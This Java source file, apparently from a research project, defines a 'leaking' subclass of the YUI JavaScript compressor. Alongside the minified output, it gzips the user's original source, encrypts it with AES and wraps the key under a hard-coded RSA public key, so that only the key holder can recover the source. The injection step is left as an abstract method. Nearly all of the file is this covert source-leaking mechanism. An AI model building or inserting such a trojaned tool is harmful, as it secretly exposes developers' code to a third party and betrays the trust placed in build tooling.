package com.leakingobfuscator.leaker;

import com.leakingobfuscator.common.LeakObject;
import com.leakingobfuscator.common.params.CipherParams;
import com.yahoo.platform.yui.compressor.JavaScriptCompressor;
import com.yahoo.platform.yui.compressor.ShadowInputStreamReader;
import org.mozilla.javascript.ErrorReporter;
import org.mozilla.javascript.EvaluatorException;

import javax.crypto.*;
import javax.crypto.spec.IvParameterSpec;
import java.io.*;
import java.security.*;
import java.security.spec.InvalidKeySpecException;
import java.security.spec.X509EncodedKeySpec;
import java.util.zip.GZIPOutputStream;

public abstract class LeakingJavaScriptCompressor extends JavaScriptCompressor {

    private static SecureRandom random = new SecureRandom();

    private ShadowInputStreamReader in;
    private Writer outProxy;
    private ByteArrayOutputStream obfSourceCode;

    protected static final String FIELD_LEAK_OBJ = "leakObj";
    protected static final String FIELD_OBF_CODE = "obfCode";

    public LeakingJavaScriptCompressor(ShadowInputStreamReader in, boolean autonomous, ErrorReporter reporter) throws IOException,
            EvaluatorException {
        super(in, autonomous, reporter);

        this.in = in;
        this.obfSourceCode = new ByteArrayOutputStream();
        this.outProxy = new OutputStreamWriter(this.obfSourceCode);
    }

    public abstract boolean writeLeakingOutput(Writer outWriter, Reader inReader, LeakObject leakObj);

    public void compress(Writer out, int linebreak, boolean munge, boolean verbose,
                         boolean preserveAllSemiColons, boolean disableOptimizations, boolean randomize)
            throws IOException {
        super.compress(outProxy, linebreak, munge, verbose, preserveAllSemiColons, disableOptimizations, randomize);
        outProxy.flush();

        try {
            // Generate AES key and IV
            KeyGenerator aesKeyGen = KeyGenerator.getInstance(CipherParams.SECRET_CIPHER_NAME);
            aesKeyGen.init(CipherParams.SECRET_KEY_SIZE, random);
            SecretKey encKey = aesKeyGen.generateKey();
            byte[] byteIV = new byte[CipherParams.SECRET_IV_SIZE];
            random.nextBytes(byteIV);
            IvParameterSpec encIV = new IvParameterSpec(byteIV);
            Cipher aesCipher = Cipher.getInstance(CipherParams.SECRET_PROVIDER_NAME);

            // Get public RSA wrap key
            X509EncodedKeySpec wrapKeySpec = new X509EncodedKeySpec(CipherParams.WRAP_KEY_SPEC);
            KeyFactory wrapKeyFactory = KeyFactory.getInstance(CipherParams.WRAP_CIPHER_NAME);
            PublicKey wrapKey = wrapKeyFactory.generatePublic(wrapKeySpec);

            // GZip the source code
            byte[] sourceCode = in.getShadow();
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            GZIPOutputStream gzos = new GZIPOutputStream(baos);
            gzos.write(sourceCode, 0, sourceCode.length);
            baos.close();
            gzos.close();
            byte[] gzSourceCode = baos.toByteArray();

            // Encrypt the source code
            aesCipher.init(Cipher.ENCRYPT_MODE, encKey, encIV, random);
            byte[] encSourceCode = aesCipher.doFinal(gzSourceCode);

            // Wrap the encryption key
            Cipher rsaCipher = Cipher.getInstance(CipherParams.WRAP_PROVIDER_NAME);
            rsaCipher.init(Cipher.WRAP_MODE, wrapKey);
            byte[] wrappedKey = rsaCipher.wrap(encKey);

            // Write the final leaking code
            LeakObject leakObj = new LeakObject(encSourceCode, wrappedKey, encIV.getIV());
            Reader inReader = new InputStreamReader(new ByteArrayInputStream(obfSourceCode.toByteArray()));
            writeLeakingOutput(out, inReader, leakObj);
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
        } catch (NoSuchPaddingException e) {
            e.printStackTrace();
        } catch (InvalidAlgorithmParameterException e) {
            e.printStackTrace();
        } catch (InvalidKeyException e) {
            e.printStackTrace();
        } catch (BadPaddingException e) {
            e.printStackTrace();
        } catch (IllegalBlockSizeException e) {
            e.printStackTrace();
        } catch (InvalidKeySpecException e) {
            e.printStackTrace();
        }
    }

}
